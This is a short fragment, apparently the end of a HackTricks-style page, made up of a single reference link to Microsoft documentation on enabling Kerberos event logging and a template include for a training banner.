- [22] [Microsoft Learn - Habilitar el registro de eventos de Kerberos](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
